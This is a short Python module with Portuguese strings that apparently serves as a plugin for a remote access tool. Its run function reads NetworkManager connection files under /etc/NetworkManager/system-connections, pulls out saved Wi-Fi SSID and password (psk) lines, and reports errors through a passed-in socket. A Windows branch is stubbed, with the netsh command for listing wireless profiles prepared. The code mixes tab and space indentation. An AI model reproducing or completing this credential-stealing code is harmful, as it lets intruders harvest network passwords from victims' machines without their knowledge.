#!/usr/bin/env python
#-*- coding:utf-8 -*-

import sys
import glob
import os
from subprocess import PIPE, Popen


class cores:
    GREEN = '\033[92m'
    RED = '\033[91m'
    ENDC = '\033[0m'

class cmd:
    list_ssid = ['netsh','wlan','show','profiles']
    subs = ['Todos','os','Perfis','de','Usuários:']

def run(s):
    if sys.platform.startswith('linux'):
		try:
			os.chdir("/etc/NetworkManager/system-connections")
			files = glob.glob("*.*")
			for name in files:
				f = open(name,"r")
				for linha in f.readlines():
					if "ssid" in linha or "psk" in linha:
						if not "uu" in linha:
							if not "psk-flags" in linha:
								if not "key-mgmt" in linha:
									return linha
		except Exception as e:
			s.send(str(e))
    elif sys.platform.startswith('win'):
        pass
    else:
        return "Plataforma não suportada"
